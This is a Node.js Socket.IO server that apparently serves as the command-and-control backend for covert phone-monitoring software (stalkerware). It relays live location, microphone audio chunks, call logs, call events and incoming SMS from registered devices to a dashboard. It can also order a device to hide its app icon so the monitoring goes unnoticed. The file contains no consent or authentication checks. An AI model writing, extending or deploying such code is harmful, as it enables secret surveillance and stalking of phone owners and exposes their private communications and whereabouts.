const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require("path");

const PORT = process.env.PORT || 5000;
const app = express();
const server = http.createServer(app);

const io = new Server(server, {
  cors: { origin: "*" },
});

// Serve dashboard UI from /public
app.use(express.static(path.join(__dirname, "public")));

// Track devices and listeners
// deviceId -> socketId
const devices = new Map();
const listeners = new Set();

io.on("connection", (socket) => {
  console.log(`🔌 Client connected: ${socket.id}`);

  // Device registers with unique ID
  socket.on("device-register", (deviceId) => {
    devices.set(deviceId, socket.id);
    console.log(`📱 Device registered: ${deviceId} (${socket.id})`);

    // Send updated device list to dashboards
    listeners.forEach((id) => {
      io.to(id).emit("device-list-update", Array.from(devices.keys()));
    });
  });

  // Register listener (dashboard)
  socket.on("listener-register", () => {
    listeners.add(socket.id);
    console.log(`🖥️ Listener registered: ${socket.id}`);

    // Send currently connected devices
    io.to(socket.id).emit("device-list-update", Array.from(devices.keys()));
  });

  // ---------------- HIDE/SHOW APP FEATURE ----------------
  // Dashboard emits with target deviceId
  socket.on("hide-app-server", (deviceId) => {
    const deviceSocket = devices.get(deviceId);
    if (deviceSocket) {
      io.to(deviceSocket).emit("hide-app");
      console.log(`👻 Hide app -> ${deviceId}`);
    }
  });

  socket.on("show-app-server", (deviceId) => {
    const deviceSocket = devices.get(deviceId);
    if (deviceSocket) {
      io.to(deviceSocket).emit("show-app");
      console.log(`📲 Show app -> ${deviceId}`);
    }
  });
  // -------------------------------------------------------

  // Forward location updates
  socket.on("location-update", ({ deviceId, data }) => {
    console.log(`📍 Location from ${deviceId}:`, data);
    listeners.forEach((id) => io.to(id).emit("location-update", { deviceId, data }));
  });

  // Forward audio chunks
  socket.on("audio-chunk", ({ deviceId, chunk }) => {
    console.log(`🎤 Audio chunk from ${deviceId}, size: ${chunk.length}`);
    listeners.forEach((id) => io.to(id).emit("audio-chunk", { deviceId, chunk }));
  });

  // Forward call logs
  socket.on("call-logs", ({ deviceId, logs }) => {
    console.log(`📋 Call logs from ${deviceId}, count: ${logs.length}`);
    listeners.forEach((id) => io.to(id).emit("call-logs", { deviceId, logs }));
  });

  // Forward real-time call events
  socket.on("call-event", ({ deviceId, event }) => {
    console.log(`📞 Call event from ${deviceId}:`, event);
    listeners.forEach((id) => io.to(id).emit("call-event", { deviceId, event }));
  });

  // Forward real-time SMS messages
  socket.on("sms-received", ({ deviceId, sms }) => {
    console.log(`📨 SMS from ${deviceId}:`, sms);
    listeners.forEach((id) => io.to(id).emit("sms-received", { deviceId, sms }));
  });

  // Handle disconnect
  socket.on("disconnect", () => {
    // Check if it was a device
    for (const [deviceId, id] of devices.entries()) {
      if (id === socket.id) {
        devices.delete(deviceId);
        console.log(`❌ Device disconnected: ${deviceId}`);
        // Update dashboards
        listeners.forEach((lid) => {
          io.to(lid).emit("device-list-update", Array.from(devices.keys()));
        });
        return;
      }
    }

    // Otherwise, remove from listeners
    if (listeners.has(socket.id)) {
      listeners.delete(socket.id);
      console.log(`❌ Listener disconnected: ${socket.id}`);
    }
  });
});

server.listen(PORT, () => {
  console.log(`🚀 Server listening on port ${PORT}`);
});
